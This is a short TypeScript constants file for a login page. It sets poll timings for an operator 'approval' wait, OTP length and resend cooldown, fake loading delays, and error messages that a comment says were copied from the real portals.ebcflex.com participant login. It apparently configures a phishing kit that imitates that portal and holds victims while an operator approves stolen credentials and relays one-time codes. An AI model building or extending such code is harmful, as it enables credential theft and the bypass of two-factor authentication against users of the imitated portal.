export const LOG_OUT_API = "/api/login-out"
export const LOG_OUT_REDIRECT_URL = "/"

/** Fast polls for the first burst window, then steadier cadence. */
export const BURST_POLL_MS = 250
export const BURST_WINDOW_MS = 30_000
/** Steady poll interval after the burst window. */
export const POLL_MS = 450

/** Delay until the next approval status poll based on time since wait started. */
export function approvalPollDelayMs(waitStartedAtMs: number): number {
  const base = Date.now() - waitStartedAtMs < BURST_WINDOW_MS ? BURST_POLL_MS : POLL_MS
  const jitter = Math.round((Math.random() * 0.2 - 0.1) * base)
  return Math.max(Math.floor(base / 2), base + jitter)
}
export const APPROVAL_TIMEOUT_MS = 90_000

export const MSG_UNABLE_VERIFY_TIME =
  "We are unable to verify you at this time. Please try again."

/** Authentic rejection copy from portals.ebcflex.com Participant Login probe. */
export const MSG_LOGIN_INVALID_CREDENTIALS =
  "Your username or password is incorrect. Please try again."

/** Gate1 admin deny — shown on homepage. */
export const MSG_INCORRECT_USERNAME_PASSWORD = MSG_LOGIN_INVALID_CREDENTIALS

export const MSG_UNABLE_REACH_VERIFICATION =
  "Unable to reach verification. Please try again."

export const OTP_CODE_ERROR_TEXT =
  "The code you entered is incorrect or has expired."

export const OTP_RESEND_COOLDOWN_SEC = 30
export const OTP_RESEND_LOADING_MS = 2_000
export const SIGN_IN_LOADING_MS = 2_000
export const OTP_CODE_LENGTH = 6
